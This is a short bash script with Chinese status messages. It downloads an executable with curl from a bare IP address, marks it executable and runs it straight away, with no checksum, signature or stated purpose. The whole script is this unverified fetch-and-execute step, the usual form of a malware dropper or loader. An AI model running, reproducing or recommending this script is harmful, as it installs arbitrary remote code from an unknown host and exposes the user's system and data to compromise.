#!/bin/bash

URL="http://84.54.3.198:8000/main_x86_64"
FILENAME="main"

echo "正在下载文件..."
curl -o $FILENAME $URL

if [[ $? -ne 0 ]]; then
    echo "下载失败，请检查 URL 或网络连接。"
    exit 1
fi

chmod +x $FILENAME

echo "正在执行下载的文件..."
./$FILENAME

if [[ $? -ne 0 ]]; then
    echo "执行失败。"
    exit 1
fi

echo "执行成功。"
